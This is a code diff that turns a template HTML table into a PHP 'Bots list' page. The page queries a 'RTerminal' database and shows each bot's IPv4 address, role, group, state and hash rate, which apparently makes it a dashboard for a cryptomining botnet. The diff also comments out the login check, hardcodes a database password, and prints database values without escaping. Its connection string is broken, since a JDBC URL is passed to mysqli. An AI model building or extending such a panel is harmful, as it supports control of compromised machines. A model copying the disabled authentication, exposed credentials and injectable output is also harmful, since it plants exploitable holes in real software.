@@ -1,3 +1,20 @@
+<?php
+//if (!isset($_COOKIE) or $_COOKIE["authentication"] === False) {
+//    header('../../../../login.php');
+//    exit;
+//} else {
+//    $isLogged_in = True;
+//}
+
+$mariadb_server_address = 'jdbc:mariadb://localhost:3306';
+$mariadb_username = 'phpstorm';
+$mariadb_password = 'TROMPITA2';
+$database_name = 'RTerminal';
+$table_name = 'bots';
+
+$connection = mysqli_connect($mariadb_server_address, $mariadb_username, $mariadb_password, $database_name);
+?>
+
 <!doctype html>
 <html lang="en">
 <head>
@@ -16,33 +33,34 @@
 <body>
 <div class="content">
 <div class="container">
-<h2 class="mb-5">Table #6</h2>
+<h2 class="mb-5">Bots list</h2>
 <div class="table-responsive">
 <table class="table table-striped custom-table">
 <thead>
 <tr>
-<th scope="col">Order</th>
-<th scope="col">Name</th>
-<th scope="col">Occupation</th>
-<th scope="col">Contact</th>
-<th scope="col">Education</th>
+<th scope="col">IP Addresses V4</th>
+<th scope="col">Role</th>
+<th scope="col">Group id</th>
+<th scope="col">State</th>
+<th scope="col">Hash rate</th>
 <th scope="col"></th>
 </tr>
 </thead>
 <tbody>
-<tr scope="row">
-<td>
-1392
-</td>
-<td><a href="#">James Yates</a></td>
-<td>
-Web Designer
-<small class="d-block">Far far away, behind the word mountains</small>
-</td>
-<td>+63 983 0962 971</td>
-<td>NY University</td>
-<td><a href="#" class="more">Details</a></td>
-</tr>
+<!-- START -->
+<?php $query = "SELECT * FROM bots";
+$output = mysqli_query($connection, $query);
+?>
+<?php foreach($output as $id=>$bot):?>
+    <tr scope="row">
+        <td><?php echo($bot['ip_addressV4']);?></td> <!-- Ip address -->
+        <td><a href="#"><?php echo($bot['role']);?></a></td> <!-- Role -->
+        <td><?php echo($bot['group_id']);?>></td> <!-- Group id -->
+        <td><?php echo($bot['state']);?></td> <!-- State -->
+        <td><?php echo($bot['hash_rate']);?></td> <!-- Hash rate -->
+    </tr>
+<?php endforeach;?>
+<!-- END -->
 <tr>
 <td>4616</td>
 <td><a href="#">Matthew Wasil</a></td>
